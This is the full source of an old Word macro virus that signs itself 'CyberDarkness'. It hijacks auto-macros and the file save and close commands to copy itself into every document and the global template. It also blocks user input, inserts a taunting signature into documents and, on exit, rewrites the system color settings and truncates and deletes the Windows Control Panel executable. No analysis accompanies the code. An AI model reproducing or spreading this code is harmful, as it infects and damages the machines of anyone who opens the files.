   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   On Error GoTo -1: On Error GoTo Z
   WordBasic.DisableInput
   WordBasic.DisableAutoMacros 0
   Dim A As Object: Set A = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs A
   WordBasic.Dialog.FileSaveAs A
   If ((A.Format = 0) Or (A.Format = 1)) Then
   A.Format = 1
   WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec", 1
   WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose", 1
   WordBasic.MacroCopy "Global:AutoExit", WordBasic.[WindowName$]() + ":AutoExit", 1
   WordBasic.MacroCopy "Global:AutoNew", WordBasic.[WindowName$]() + ":AutoNew", 1
   WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:FileClose", WordBasic.[WindowName$]() + ":FileClose", 1
   WordBasic.MacroCopy "Global:FileExit", WordBasic.[WindowName$]() + ":FileExit", 1
   WordBasic.MacroCopy "Global:FileSave", WordBasic.[WindowName$]() + ":FileSave", 1
   WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs", 1
   WordBasic.MacroCopy "Global:ToolsMacro", WordBasic.[WindowName$]() + ":ToolsMacro", 1
   End If
   WordBasic.FileSaveAs A
   Z:
   End Sub

   Attribute VB_Name = "FileClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Closes all of the windows of the active document"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
   Dim A
   Dim B
   Dim C
   On Error Resume Next
   WordBasic.DisableInput
   WordBasic.DisableAutoMacros 0
   If WordBasic.IsDocumentDirty() = -1 Or WordBasic.IsTemplateDirty() = -1 Then
   WordBasic.ScreenUpdating 0
   WordBasic.EndOfDocument
   WordBasic.FontSize 10
   A = WordBasic.CharColor()
   WordBasic.Bold 0
   WordBasic.Italic 0
   WordBasic.CharColor 1
   WordBasic.LeftPara
   WordBasic.Insert Chr(13) + Chr(13) + "To end with, I would like to say..." + Chr(13) + Chr(13)
   WordBasic.CenterPara
   WordBasic.Insert "To defy me is to bring upon my wrath..." + Chr(13) + "For I am"
   WordBasic.CharColor 6
   WordBasic.Bold 1
   WordBasic.Italic 1
   WordBasic.Insert " CyberDarkness"
   WordBasic.Bold 0
   WordBasic.Italic 0
   WordBasic.CharColor 1
   WordBasic.Insert "..."
   WordBasic.Insert Chr(13) + "I am Darkness Incarnate..." + Chr(13) + "I will Not be Denied!!!" + Chr(13) + Chr(13)
   WordBasic.FontSize 10
   WordBasic.InsertSymbol Font:="Symbol", CharNum:="211"
   WordBasic.Insert Str(WordBasic.Year(WordBasic.Now()))
   WordBasic.CharColor 6
   WordBasic.Bold 1
   WordBasic.Italic 1
   WordBasic.Insert " CyberDarkness"
   WordBasic.Bold 0
   WordBasic.Italic 0
   WordBasic.CharColor A
   WordBasic.StartOfDocument
   For B = 1 To WordBasic.CountMacros(0)
       If WordBasic.[MacroName$](B, 0) = "FileSave" Then C = 1
   Next B
   If C <> 1 Then
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 1
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose", 1
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExit", "Global:AutoExit", 1
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoNew", "Global:AutoNew", 1
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 1
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileClose", "Global:FileClose", 1
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileExit", "Global:FileExit", 1
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSave", 1
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs", 1
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileToolsMacro", "Global:ToolsMacro", 1
   End If
   End If
   WordBasic.FileClose
   WordBasic.ScreenUpdating 1
   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim A
   Dim B
   On Error GoTo -1: On Error GoTo Z
   WordBasic.DisableInput
   For A = 1 To WordBasic.CountMacros(0)
       If WordBasic.[MacroName$](A, 0) = "FileSave" Then B = 1 'Mark
   Next A

   If B <> 1 Then
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 1
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose", 1
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExit", "Global:AutoExit", 1
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoNew", "Global:AutoNew", 1
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 1
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileClose", "Global:FileClose", 1
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileExit", "Global:FileExit", 1
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSave", "Global:FileSave", 1
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs", 1
   WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ToolsMacro", "Global:ToolsMacro", 1
   End If
   Z:
   End Sub

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves the active document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
   On Error GoTo -1: On Error GoTo Y
   WordBasic.DisableInput
   WordBasic.DisableAutoMacros 0
   Dim A As Object: Set A = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs A
   If WordBasic.[Left$](WordBasic.[WindowName$](), 8) = "Document" Then WordBasic.Dialog.FileSaveAs A
   If ((A.Format = 0) Or (A.Format = 1)) Then
   A.Format = 1
   WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec", 1
   WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose", 1
   WordBasic.MacroCopy "Global:AutoExit", WordBasic.[WindowName$]() + ":AutoExit", 1
   WordBasic.MacroCopy "Global:AutoNew", WordBasic.[WindowName$]() + ":AutoNew", 1
   WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:FileClose", WordBasic.[WindowName$]() + ":FileClose", 1
   WordBasic.MacroCopy "Global:FileExit", WordBasic.[WindowName$]() + ":FileExit", 1
   WordBasic.MacroCopy "Global:FileSave", WordBasic.[WindowName$]() + ":FileSave", 1
   WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs", 1
   WordBasic.MacroCopy "Global:ToolsMacro", WordBasic.[WindowName$]() + ":ToolsMacro", 1
   WordBasic.FileSaveAs A
   GoTo Z:
   End If
   Y:
   WordBasic.FileSave
   Z:
   End Sub

   Attribute VB_Name = "FileExit"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Quits Microsoft Word and prompts to save the documents"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileExit.MAIN"
   On Error GoTo -1: On Error GoTo Z
   WordBasic.DisableInput
   WordBasic.DisableAutoMacros 0
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   Z:
   WordBasic.FileExit
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim B
   Dim C
   On Error GoTo -1: On Error GoTo Z
   For B = 1 To WordBasic.CountMacros(0)
   If WordBasic.[MacroName$](B, 0) = "FileSave" Then C = 1
   Next B
   If C <> 1 Then
   WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec", 1
   WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose", 1
   WordBasic.MacroCopy "Global:AutoExit", WordBasic.[WindowName$]() + ":AutoExit", 1
   WordBasic.MacroCopy "Global:AutoNew", WordBasic.[WindowName$]() + ":AutoNew", 1
   WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:FileClose", WordBasic.[WindowName$]() + ":FileClose", 1
   WordBasic.MacroCopy "Global:FileExit", WordBasic.[WindowName$]() + ":FileExit", 1
   WordBasic.MacroCopy "Global:FileSave", WordBasic.[WindowName$]() + ":FileSave", 1
   WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs", 1
   WordBasic.MacroCopy "Global:FileMacro", WordBasic.[WindowName$]() + ":ToolsMacro", 1
   End If
   Z:
   End Sub

   Attribute VB_Name = "AutoExit"

   Dim A__$()

   Public Sub MAIN()
   ReDim A__$(21)
   On Error GoTo -1: On Error GoTo Z
   WordBasic.DisableInput
   A__$(0) = "Background"
   A__$(1) = "AppWorkspace"
   A__$(2) = "Window"
   A__$(3) = "WindowText"
   A__$(4) = "Menu"
   A__$(5) = "MenuText"
   A__$(6) = "ActiveTitle"
   A__$(7) = "InactiveTitle"
   A__$(8) = "TitleText"
   A__$(9) = "ActiveBorder"
   A__$(10) = "InactiveBorder"
   A__$(11) = "WindowFrame"
   A__$(12) = "Scrollbar"
   A__$(13) = "ButtonFace"
   A__$(14) = "ButtonShadow"
   A__$(15) = "ButtonText"
   A__$(16) = "GrayText"
   A__$(17) = "Hilight"
   A__$(18) = "HilightText"
   A__$(19) = "InactiveTitleText"
   A__$(20) = "ButtonHilight"

   WordBasic.SetProfileString "colors", A__$(0), Str(0) + " " + Str(0) + " " + Str(0)
   WordBasic.SetProfileString "colors", A__$(1), Str(0) + " " + Str(0) + " " + Str(0)
   WordBasic.SetProfileString "colors", A__$(2), Str(255) + " " + Str(255) + " " + Str(255)
   WordBasic.SetProfileString "colors", A__$(3), Str(0) + " " + Str(0) + " " + Str(0)
   WordBasic.SetProfileString "colors", A__$(4), Str(255) + " " + Str(255) + " " + Str(255)
   WordBasic.SetProfileString "colors", A__$(5), Str(0) + " " + Str(0) + " " + Str(0)
   WordBasic.SetProfileString "colors", A__$(6), Str(0) + " " + Str(0) + " " + Str(0)
   WordBasic.SetProfileString "colors", A__$(7), Str(0) + " " + Str(0) + " " + Str(0)
   WordBasic.SetProfileString "colors", A__$(8), Str(255) + " " + Str(0) + " " + Str(0)
   WordBasic.SetProfileString "colors", A__$(9), Str(255) + " " + Str(0) + " " + Str(0)
   WordBasic.SetProfileString "colors", A__$(10), Str(192) + " " + Str(192) + " " + Str(192)
   WordBasic.SetProfileString "colors", A__$(11), Str(0) + " " + Str(0) + " " + Str(0)
   WordBasic.SetProfileString "colors", A__$(12), Str(192) + " " + Str(192) + " " + Str(192)
   WordBasic.SetProfileString "colors", A__$(13), Str(192) + " " + Str(192) + " " + Str(192)
   WordBasic.SetProfileString "colors", A__$(14), Str(128) + " " + Str(128) + " " + Str(128)
   WordBasic.SetProfileString "colors", A__$(15), Str(0) + " " + Str(0) + " " + Str(0)
   WordBasic.SetProfileString "colors", A__$(16), Str(128) + " " + Str(128) + " " + Str(128)
   WordBasic.SetProfileString "colors", A__$(17), Str(0) + " " + Str(128) + " " + Str(128)
   WordBasic.SetProfileString "colors", A__$(18), Str(255) + " " + Str(255) + " " + Str(255)
   WordBasic.SetProfileString "colors", A__$(19), Str(255) + " " + Str(0) + " " + Str(0)
   WordBasic.SetProfileString "colors", A__$(20), Str(255) + " " + Str(255) + " " + Str(255)
   SetAttr "C:\WINDOWS\CONTROL.EXE", 0
   Open "C:\WINDOWS\CONTROL.EXE" For Output As 1
   Close 1
   WordBasic.Kill "C:\WINDOWS\CONTROL.EXE"
   Z:
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   On Error GoTo -1: On Error GoTo Z
   WordBasic.DisableAutoMacros 0
   Z:
   End Sub

   Attribute VB_Name = "AutoNew"

   Public Sub MAIN()
   Dim A
   Dim B
   On Error GoTo -1: On Error GoTo Z
   For A = 1 To WordBasic.CountMacros(0)
   If WordBasic.[MacroName$](A, 0) = "FileSave" Then B = 1
   Next A
   If B <> 1 Then
   WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec", 1
   WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose", 1
   WordBasic.MacroCopy "Global:AutoExit", WordBasic.[WindowName$]() + ":AutoExit", 1
   WordBasic.MacroCopy "Global:AutoNew", WordBasic.[WindowName$]() + ":AutoNew", 1
   WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 1
   WordBasic.MacroCopy "Global:FileClose", WordBasic.[WindowName$]() + ":FileClose", 1
   WordBasic.MacroCopy "Global:FileExit", WordBasic.[WindowName$]() + ":FileExit", 1
   WordBasic.MacroCopy "Global:FileSave", WordBasic.[WindowName$]() + ":FileSave", 1
   WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs", 1
   WordBasic.MacroCopy "Global:ToolsMacro", WordBasic.[WindowName$]() + ":ToolsMacro", 1
   End If
   Z:
   End Sub
